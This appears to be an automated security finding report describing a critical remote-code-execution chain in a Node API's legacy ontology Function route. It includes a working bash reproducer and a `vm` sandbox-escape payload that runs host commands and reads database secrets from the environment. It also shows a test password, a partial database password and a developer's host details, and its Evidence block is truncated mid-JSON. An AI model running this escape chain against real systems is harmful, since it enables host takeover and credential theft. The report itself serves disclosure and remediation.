# RCE: un-gated legacy ontology Function register+invoke escapes Node vm sandbox to host command execution

**ID:** vuln-0041
**Severity:** CRITICAL
**Found:** 2026-08-18 07:12:22 UTC
**Target:** http://host.docker.internal:3000
**Endpoint:** /api/v1/ontology/:ontologyId/functions/:apiName/invoke
**Method:** POST
**CWE:** CWE-94
**CVSS:** 9.9
**Fix Effort:** Medium

## Description

Any low-priv authenticated user (e.g. a **viewer**) can register an arbitrary TypeScript **Function** through the legacy ontology route and immediately invoke it, escaping the Node `vm` sandbox to execute arbitrary OS commands on the host as the API process user. The route carries **no** `authorizePublish()` gate, no transpile/import validation, and no audit — the publish-authorization boundary documented for the Functions executor is wired only to the canonical `/api/v1/functions/:rid/versions` and `/api/v1/code-repositories/:rid/tags` endpoints, not to this parallel legacy router.

## Evidence

PoC executed as low-priv **viewer** against the live host (ontology `00000000-0000-0000-0000-000000000001`).

**Step 2 — register (viewer, no `authorizePublish` gate):**
```http
POST /api/v1/ontology/00000000-0000-0000-0000-000000000001/functions  →  HTTP 201
{"function":{"function_id":"c10c7dd5-...","api_name":"strixprobe2","runtime":"typescript",...},"versions":[{"version":1}]}
```

**Step 4 — invoke (host command execution):**
```json
{
  "output": {
    "escaped": true,
    "uid": "uid=501(olivierhabimana) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),...",

**Step 5 — secret disclosure (process env key names readable from the compromised API process):**

{"output":{"secretKeysReadable":["PGPASSWORD","POSTGRES_URL","PGUSER","PGDATABASE","PGHOST"]}}
```
(Values redacted; `PGPASSWORD`tellus123` and the `POSTGRES_URL` DSN were observed readable.)

**Step 6 — cleanup:** `DELETE .../functions/strixprobe2 → HTTP 204` (probe removed).

Host is the developer macOS machine (API runs on the host, cwd `/Users/olivierhabimana/Desktop/projects/tellus`), not an isolated container.

## Impact

A viewer-level principal achieves **remote code execution on the host running the API**: the PoC returned `uid=501(olivierhabimana) gid=20(staff)` and hostname `Olivier-HABIMANA.local` from `child_process.execSync` executed inside the "sandboxed" function, and `fs.writeFileSync` wrote/read a file on the host. The compromised process environment exposes database credentials — the sandbox read `PGPASSWORD` and `POSTGRES_URL` (plus `PGUSER`/`PGDATABASE`/`PGHOST`) — enabling full compromise of the ontology database and lateral movement. Any tenant user with valid credentials can take over the API host identity.

## Technical Analysis

Two layered failures combine into a complete low-priv → host RCE chain.

**1. Authorization gap (publish gate bypass).** `src/server.ts:1293` mounts the legacy router at `/api/v1/ontology/:ontologyId/functions`. Within it, `src/routes/functions.ts` handler `POST /` (line 28) inserts a new row into `ontology_function` and `ontology_function_version` directly from the request's raw `sourceCode`, and `POST /:apiName/invoke` (line 160) executes it. **Neither handler calls `authorizePublish()`** — the documented "only explicitly authorized authors may publish executable Functions" stopgap (`src/services/functions/executionPolicy.ts`) is enforced only on the newer TypeScript-Functions endpoints. So the entire publish trust boundary is trivially sidestepped via this parallel route; a mere authenticated principal is sufficient.

**2. Sandbox escape (vm is not a boundary).** Execution uses `runSandboxed(source_code, input)` (`src/routes/functions.ts:196`), which runs the source with Node's `vm` module **in the main API process event loop** (`src/services/functionRuntime.ts`, `vm.createContext(context)` at line 61/109 and `new vm.Script(...).runInContext(...)` at line 62/112). A `vm` context shares the host heap, and the global-proxy `this` retains a reachable `constructor.constructor` chain to the host `Function` constructor. `this.constructor.constructor("return process")()` therefore returns the **real host `process` object**, from which `process.mainModule.require("child_process")` (or `process.constructor("return require")()`) yields `child_process`/`fs`/`http`. The claimed mitigations in the file header (no `require`, no `process`, no `fs`) apply only to *non-escaped* code and do not survive this well-known escape class; unlike the production path there is not even a worker-thread separation or env whitelist here.

## Proof of Concept

1. Mint a viewer token from Keycloak (realm `tellus`, public client `tellus-frontend`, viewer account `cypress-viewer@tellus.local`).
2. Register a new function in the default ontology via `POST /api/v1/ontology/00000000-0000-0000-0000-000000000001/functions` with a benign `sourceCode` body. Observe HTTP 201 (a viewer was allowed to publish with no authorization gate).
3. Publish a second version whose source escapes the sandbox (`this.constructor.constructor("return process")()` then `require("child_process").execSync("id && hostname")`).
4. Invoke it via `POST .../functions/<apiName>/invoke` with `{"input":{}}` and observe the host `id`/`hostname` output returned in the response body.
5. (Secret disclosure) Publish/invoke a variant that enumerates `process.env` key names; observe `PGPASSWORD`, `POSTGRES_URL`, `PGUSER`, `PGDATABASE`, `PGHOST` are all readable.
6. Clean up with `DELETE .../functions/<apiName>` (confirmed HTTP 204).

```bash
#!/bin/bash
# RCE reproducer: legacy ontology Function register+invoke -> host command exec.
# Requires: curl, python3. Tested PoC user: viewer (low-priv).
set -e
BASE="http://host.docker.internal:3000"
ONT="00000000-0000-0000-0000-000000000001"

# 1. Mint a low-priv (viewer) access token.
TOK=$(curl -s -X POST \
  "http://host.docker.internal:8086/realms/tellus/protocol/openid-connect/token" \
  -H "Host: localhost:8086" -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=tellus-frontend&username=cypress-viewer@tellus.local&password=Password123!&scope=openid" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")
echo "[+] viewer token len=${#TOK}"

# 2. Register a function (viewer, NO publish gate). Expect 201.
curl -s -X POST "$BASE/api/v1/ontology/$ONT/functions" \
  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
  -d '{"apiName":"rce_poc","displayName":"rce_poc","sourceCode":"module.exports=function(i){return i}"}' \
  | python3 -m json.tool | head -5

# 3. Publish an escape version.
python3 -c 'import json;print(json.dumps({"sourceCode":"module.exports=function(){const p=this.constructor.constructor(\"return process\")();const cp=p.mainModule?p.mainModule.require(\"child_process\"):p.constructor(\"return require\")()(\"child_process\");return cp.execSync(\"id && hostname\").toString()}"}))' > /tmp/rce_src.json
curl -s -X POST "$BASE/api/v1/ontology/$ONT/functions/rce_poc/versions" \
  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d @/tmp/rce_src.json > /dev/null

# 4. Invoke -> host command execution.
echo "[+] invoke output (host id/hostname):"
curl -s -X POST "$BASE/api/v1/ontology/$ONT/functions/rce_poc/invoke" \
  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d '{"input":{}}' \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['output'])"

# 5. Cleanup.
curl -s -o /dev/null -w "[+] cleanup DELETE HTTP %{http_code}\n" -X DELETE \
  "$BASE/api/v1/ontology/$ONT/functions/rce_poc" -H "Authorization: Bearer $TOK"
```

## Remediation

1. Immediately gate the legacy route: require `authorizePublish()` (the same gate used by `/api/v1/functions/:repositoryRid/versions`) plus ontology-ownership/superadmin checks on `POST /`, `POST /:apiName/versions`, and `POST /:apiName/invoke` — or decommission the legacy router entirely now that the canonical Functions registry exists.
2. Never execute untrusted source in-process: remove the in-process `runSandboxed` path for user-supplied code and route all invocation through the worker-pool executor (`src/services/functionWorkerPool.ts`) so user code runs outside the API event loop with an env whitelist.
3. Add a defense-in-depth escape guard: reject/route-around sources reachable to the host `Function` constructor (e.g. freeze/neuter `constructor` chains on the sandbox global, or run under a real isolate such as `isolated-vm`/Firecracker), and validate imports/AST at publish time.
4. Add a CI assertion that no code-registration or code-invocation route exists without publish authorization + audit.

## Assumptions

Requires any valid low-priv account (a viewer token is sufficient). Authentication is via the normal Keycloak JWT path — this chain is **independent** of the dev test-auth toggles (`CODE_REPOS_TEST_AUTH`/`TELLUS_TEST_HOOKS`), so it holds even on a properly production-flavored config as long as the legacy router remains mounted and un-gated. Scope-change rationale: an untrusted tenant-authenticated principal's JavaScript crosses the process/isolation security authority of the host runtime, yielding host-level code execution and credential disclosure.
